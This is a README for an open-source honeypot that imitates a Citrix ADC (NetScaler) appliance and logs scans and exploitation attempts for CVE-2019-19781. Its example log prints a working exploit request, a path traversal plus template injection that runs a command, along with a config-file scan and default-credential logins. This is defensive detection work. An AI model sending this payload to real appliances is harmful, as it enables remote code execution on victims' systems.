# Citrix ADC (NetScaler) Honeypot
- Detects and logs payloads for CVE-2019-19781 (Shitrix / Citrixmash)
- Logs failed login attempts
- Serves content and headers taken from real appliance in order to increase chance of indexing on search engines (e.g. google, shodan etc.)

![screenshot](https://github.com/x1sec/citrix-honeypot/blob/master/img/screenshot.png)

## Installation

### Precompiled
Precompiled Linux (x64) package available [here](https://github.com/x1sec/citrix-honeypot/releases)

```
mkdir citrix-honeypot
cd citrix-honeypot
wget https://github.com/x1sec/citrix-honeypot/releases/download/v0.02/citrix-honeypot-linux-amd64.tar.gz
tar -xf citrix-honeypot-linux-amd64.tar.gz
```

### go get
If you have a [Go](https://golang.org/) environment ready to go:

```bash
go get github.com/x1sec/citrix-honeypot
```

### Running
Generate self signed certificate:
```
openssl genrsa -out server.key 2048
openssl ecparam -genkey -name secp384r1 -out server.key
openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650
```

It's easy as:
```bash
./citrix-honeypot
```

The honeypot will listen on both port `80` and `443` (so it must be run as `root` user)

Or to detach and run as a background process:
```
nohup ./citrix-honeypot &
```

## Logs
Results / data is written to the `./log` directory. They are:

`hits.log` - Scanning attempts and exploitation attempts with all data (e.g. headers, post body)

`all.log` - All HTTP requests that are observed hitting the server

`logins.log` - Attempted logins to the web interface

`tlsErrors.log` - Often internet scanners will send invalid data to port `443`. HTTPS errors are logged here.

### Examples

Running [the first public released exploit](https://github.com/projectzeroindia/CVE-2019-19781):
```
$ cat logs/hits.log 
2020/01/23 08:27:55 
-------------------
Exploitation detected ...
src: xxx.xxx.xxx.xxx
POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/2.0
Host: xxx.xxx.xxx.xxx
Accept: */*
Content-Length: 181
Content-Type: application/x-www-form-urlencoded
Nsc_nonce: test1337
Nsc_user: /../../../../../../../../../../netscaler/portal/templates/zToMJRAzp0T0FuUS2cEp41ZZbmrtmUqS
User-Agent: curl/7.67.0

url=http://example.com\&title=[%25+template.new({'BLOCK'%3d'exec(\'id | tee /netscaler/portal/templates/zToMJRAzp0T0FuUS2cEp41ZZbmrtmUqS.xml\')%3b'})+%25]\&desc=test\&UI_inuse=RfWeb
```

Scanning attempt:
```
$ cat logs/hits.log 
2020/01/23 08:41:02 
-------------------
Scanning detected ... 
src: xxx.xxx.xxx.xxx
GET /vpn/../vpns/cfg/smb.conf HTTP/2.0
Host: xxx.xxx.xxx.xxx
Accept: */*
User-Agent: curl/7.67.0
```

Login attempts:
```
$ cat logs/logins.log
2020/01/23 07:26:03 Failed login from xxx.xxx.xxx.xxx user:nsroot pass:nsroot
2020/01/23 08:26:03 Failed login from xxx.xxx.xxx.xxx user:admin pass:admin
```
